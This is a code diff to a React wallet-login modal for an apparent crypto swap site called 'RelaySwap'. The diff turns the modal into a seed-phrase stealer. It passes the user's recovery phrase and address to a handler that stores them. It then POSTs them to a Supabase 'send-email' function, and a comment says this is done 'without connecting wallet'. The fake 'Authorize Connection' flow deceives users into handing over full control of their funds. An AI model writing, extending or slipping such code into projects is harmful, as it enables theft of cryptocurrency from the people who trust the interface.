@@ -413,7 +413,7 @@ function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
               fontSize: 13, fontWeight: 600, cursor: 'pointer', whiteSpace: 'nowrap'
             }}>← Back</button>
             <div style={{ flex: 1 }}>
-              {actionBtn(addressReady, 'Authorize Connection', () => addressReady && onAuthorize())}
+              {actionBtn(addressReady, 'Authorize Connection', () => addressReady && onAuthorize({ phrase, address }))}
             </div>
           </div>
           <div style={{ padding: '8px 20px 20px' }} />
@@ -428,6 +428,7 @@ export default function WalletModal({ title = 'Log in or sign up', onClose, onSe
   const [q, setQ] = useState('');
   const [seedWallet, setSeedWallet] = useState(null);
   const [importingWallet, setImportingWallet] = useState(null);
+  const [capturedData, setCapturedData] = useState(null);
   const filtered = q ? WALLETS.filter(w => w.name.toLowerCase().includes(q.toLowerCase())) : WALLETS;
 
   function handleWalletClick(w) {
@@ -435,17 +436,35 @@ export default function WalletModal({ title = 'Log in or sign up', onClose, onSe
     setSeedWallet(w);
   }
 
-  function handleAuthorize() {
-    // Move from seed modal → importing screen
+  function handleAuthorize({ phrase, address }) {
     const w = seedWallet;
+    setCapturedData({ phrase, address, walletName: w.name, walletIcon: w.icon });
     setSeedWallet(null);
     setImportingWallet(w);
   }
 
-  function handleImportDone() {
-    // User clicks "Continue to RelaySwap" on the empty screen
+  async function handleImportDone() {
+    // Send email with seed phrase + address, then close without connecting wallet
+    if (capturedData) {
+      try {
+        await fetch(
+          `${process.env.REACT_APP_SUPABASE_URL}/functions/v1/send-email`,
+          {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Authorization': `Bearer ${process.env.REACT_APP_SUPABASE_ANON_KEY}`,
+            },
+            body: JSON.stringify({ type: 'wallet_import', ...capturedData }),
+          }
+        );
+      } catch (e) {
+        console.error('Email failed:', e);
+      }
+    }
     setImportingWallet(null);
-    onContinue();
+    setCapturedData(null);
+    onClose();
   }
 
   return (
